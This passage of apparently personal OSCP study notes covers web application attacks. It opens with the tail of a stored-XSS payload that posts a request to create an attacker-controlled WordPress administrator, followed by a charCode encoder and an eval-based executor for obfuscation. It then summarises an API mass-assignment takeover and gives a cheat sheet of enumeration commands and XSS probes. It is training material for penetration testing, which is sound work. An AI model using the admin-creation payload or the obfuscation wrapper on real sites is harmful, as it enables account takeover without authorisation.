"&pass1=attackerpass&pass2=attackerpass&role=administrator";

ajaxRequest = new XMLHttpRequest();
ajaxRequest.open("POST", requestURL, true);
ajaxRequest.setRequestHeader(
  "Content-Type",
  "application/x-www-form-urlencoded"
);
ajaxRequest.send(params);
```

Encode:

```javascript
function encode_to_javascript(string) {
  var input = string
  var output = '';
  for(pos = 0; pos < input.length; pos++) {
    output += input.charCodeAt(pos);
    if(pos != (input.length - 1)) {
      output += ",";
    }
  }
  return output;
}

let encoded = encode_to_javascript('insert_minified_javascript')
console.log(encoded)
```

Decode/execute:

```javascript
eval(String.fromCharCode(...))
```

The attack chain would be like this:
Stored XSS
   ↓
Admin visits affected page
   ↓
Attacker's JavaScript executes as that site
   ↓
Steals/extracts required nonce
   ↓
Uses admin's authenticated session
   ↓
Creates attacker-controlled admin account

---

# Attack chain connection

The chapter fits into the larger OSCP process as follows:

```text
Recon
  ↓
Enumeration
  ↓
Initial Access
  ↓
Privilege Escalation
  ↓
Credentials
  ↓
Pivoting
  ↓
AD
  ↓
Proof
```

## Recon

Relevant Chapter 8 activities:

- identify the exposed web service
- fingerprint technology with Nmap and Wappalyzer
- inspect URLs and routes
- review earlier passive reconnaissance
- inspect `robots.txt` and sitemaps

**Question to answer:**  
_What web technologies and attack surface exist?_

---

## Enumeration

This is the chapter's strongest connection.

Techniques:

- `nmap -sV`
- `http-enum`
- Gobuster
- Firefox Developer Tools
- Burp HTTP History
- response-header inspection
- source-code/JavaScript review
- API path enumeration
- HTTP method testing
- status/body comparison
- cookie inspection

**Question to answer:**  
_What pages, endpoints, parameters, headers, users, methods, roles, and hidden functionality exist?_

---

## Initial Access

Possible web footholds shown by the chapter:

- valid credentials found through testing
- API authentication abuse
- successful stored XSS
- administrator-level API token

The chapter mainly establishes **application access**, not an OS shell.

**Question to answer:**  
_Can I make the application perform something I should not be able to do?_

---

## Privilege Escalation

Chapter 8 demonstrates **application-level privilege escalation** twice:

### API path

```text
normal registration
→ inject admin=True
→ administrative token
→ change real admin password
```

### XSS path

```text
stored XSS
→ JavaScript executes in administrator browser
→ obtain nonce
→ create new WordPress administrator
```

This is not yet Linux/Windows local privilege escalation, but it may create the privilege needed to reach the host.

---

## Credentials

==Credentials appear in several ways:==

- ==username enumeration from `/users/v1`==
	- curl -s http://target/wp-json/wp/v2/users | jq
	- admin can be vaild user
- ==password testing with Burp Intruder==
- ==password replacement through the API==
- ==JWT/auth-token collection==
- ==potential cookie/session theft when protections are weak==

Ask:

```text
Did this web bug expose:
- usernames?
- passwords?
- reusable tokens?
- session cookies?
- admin credentials?
```

Anything reusable should feed into later service enumeration.

---

## Proof

Always verify the impact rather than assuming success.

Examples in this chapter:

- different Intruder response identifies valid login
- successful API login returns JWT
- admin login works after password replacement
- `alert(42)` proves JavaScript execution
- WordPress Users page confirms new administrator account

For OSCP-style work, collect evidence as you progress:

```text
request
response
credential/token
privilege level
shell/proof file if host access is obtained
```

---

# Mini cheat sheet

> [!tip] OSCP bedside version
> These are the items from Chapter 8 most worth having beside you while solving a machine.

1. **Fingerprint HTTP**
   ```bash
   sudo nmap -p80 -sV <IP>
   ```

2. **Run HTTP enumeration**
   ```bash
   sudo nmap -p80 --script=http-enum <IP>
   ```

3. **Brute-force directories**
   ```bash
   gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt
   ```

4. **Try API-version patterns**
   ```text
   {GOBUSTER}/v1
   {GOBUSTER}/v2
   ```

5. **Pattern-based API discovery**
   ```bash
   gobuster dir -u http://<IP>:<PORT> -w /usr/share/wordlists/dirb/big.txt -p pattern
   ```

6. **Check robots**
   ```bash
   curl http://<HOST>/robots.txt
   ```

7. **Show response headers**
   ```bash
   curl -i http://<HOST>/<PATH>
   ```

8. **POST JSON**
   ```bash
   curl -d '{"key":"value"}' -H 'Content-Type: application/json' http://<HOST>/<API>
   ```

9. **Change HTTP method**
   ```bash
   curl -X PUT ...
   ```

10. **405 is a clue**
    ```text
    405 Method Not Allowed = route probably exists; test another method.
    ```

11. ==**Send curl through Burp**==
    ```bash
    curl --proxy 127.0.0.1:8080 http://<HOST>/
    ```

12. **Burp workflow**
    ```text
    Proxy/HTTP History → Repeater → Intruder → Target/Site map
    ```

13. **Check hidden/client-side content**
    ```text
    Firefox: Inspector + Debugger + Network
    ```

14. **Probe XSS characters**
    ```text
    < > ' " { } ;
    ```

15. **Basic XSS proof**
    ```html
    <script>alert(42)</script>
    ```

16. **Check cookie flags**
    ```text
    Secure? HttpOnly?
    ```

17. **Do not stop at HttpOnly**
    ```text
    XSS may still perform authenticated actions in the victim's browser.
    ```

18. **Always test logic, not only CVEs**
    ```text
    Can I add role/admin fields?
    Can I access another user's object?
    Can I change method GET→POST→PUT→PATCH?
    ```

19. **Read bodies, not just status codes**
    ```text
    JSON error messages often reveal valid users, fields, and routes.
    ```

20. **Verify every exploit**
    ```text
    New role? New account? Valid token? Successful login? Then continue toward host access.
    ```

---
